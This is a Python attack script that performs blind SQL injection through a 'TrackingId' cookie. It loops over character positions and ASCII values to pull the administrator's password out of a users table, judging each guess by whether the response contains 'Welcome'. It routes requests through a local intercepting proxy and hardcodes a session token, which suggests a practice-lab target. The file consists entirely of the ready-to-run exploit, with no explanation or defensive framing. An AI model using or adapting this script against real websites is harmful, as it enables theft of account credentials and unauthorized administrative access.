import requests
import sys
import urllib3
import urllib
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_admin_password(url):
    extracted_password = ""
    for i in range(1, 21):
        for j in range(32, 126): #use ASCII encodeing for alphanumeric and special characters as well
               sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username = 'administrator')='%s'--'" % (i, j)
               sqli_payload_encoded = urllib.parse.quote(sqli_payload)
               cookies = {'TrackingId': '8PpdVQSquXVjUfkY' + sqli_payload_encoded, 'session':'ZlqkMhvay32NqX6ZaeC5i3rpHY9KMK3g'}
               r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

               if "Welcome" not in r.text:
                   sys.stdout.write('\r' + extracted_password + chr(j))
                   sys.stdout.flush()

               else:
                    extracted_password += chr(j)
                    sys.stdout.write('\r' + extracted_password)
                    sys.stdout.flush()
                    break

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("[+] Determining administrator password...")
    sqli_admin_password(url)

if __name__ == "__main__":
    main()
